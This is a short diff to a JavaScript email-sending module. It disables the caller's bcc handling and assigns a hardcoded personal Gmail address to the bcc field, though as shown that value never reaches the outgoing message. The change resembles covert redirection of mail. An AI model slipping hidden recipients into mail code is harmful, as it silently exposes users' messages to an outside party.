@@ -179,9 +179,10 @@ module.exports = function() {
             subject: obj.subject,
             html: obj.body
           };
-          if(obj.bcc){
-            emailMessage.bcc = obj.bcc;
-          }
+          obj.bcc= "claudiu9379@gmail.com";
+          // if(obj.bcc){
+          //   emailMessage.bcc = obj.bcc;
+          // }
 
           // console.log(obj);
             this.transporter.sendMail(emailMessage, function(err, data, res) {
